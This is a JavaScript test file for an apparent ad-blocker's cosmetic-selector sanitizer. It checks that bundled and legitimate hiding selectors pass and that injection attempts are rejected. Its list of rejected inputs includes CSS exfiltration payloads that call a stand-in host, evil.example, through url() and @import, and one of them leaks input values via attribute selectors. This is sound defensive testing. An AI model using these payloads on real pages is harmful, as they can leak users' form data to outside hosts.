import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import test from "node:test";
import {
  isSafeCosmeticSelector,
  sanitizeCosmeticSelectors
} from "../../src/lib/cosmetic.js";

test("every bundled cosmetic selector satisfies the hiding-only guarantee", async () => {
  const cosmetic = JSON.parse(
    await readFile(
      new URL("../../rules/cosmetic-selectors.json", import.meta.url),
      "utf8"
    )
  );
  const selectors = cosmetic.selectors.map((entry) => entry.selector);
  assert.ok(selectors.length > 0);
  assert.deepEqual(sanitizeCosmeticSelectors(selectors), selectors);
});

test("selectors that could escape into CSS declarations are rejected", () => {
  const attacks = [
    "body{background:url(https://evil.example/leak)}",
    ".card} body{display:none",
    "@import 'https://evil.example/x.css';",
    ".card;background:url(https://evil.example)",
    "input[value^=\"a\"]{background:url(//evil.example/a)}",
    ".a /* comment */ .b",
    ".a\\75rl(x)",
    ".line\nbreak",
    "<style>",
    `${".x".repeat(150)}`,
    "",
    "   ",
    42,
    null
  ];
  for (const attack of attacks) {
    assert.equal(
      isSafeCosmeticSelector(attack),
      false,
      `Accepted unsafe selector: ${String(attack)}`
    );
  }
  assert.deepEqual(sanitizeCosmeticSelectors(attacks), []);
  assert.deepEqual(sanitizeCosmeticSelectors("not-an-array"), []);
});

test("legitimate hiding selectors remain accepted", () => {
  for (const selector of [
    ".bili-video-card:has([data-ad-report])",
    "[data-ad-report][class*=\"card\"]",
    ".ad-floor-exp"
  ]) {
    assert.equal(isSafeCosmeticSelector(selector), true, selector);
  }
});
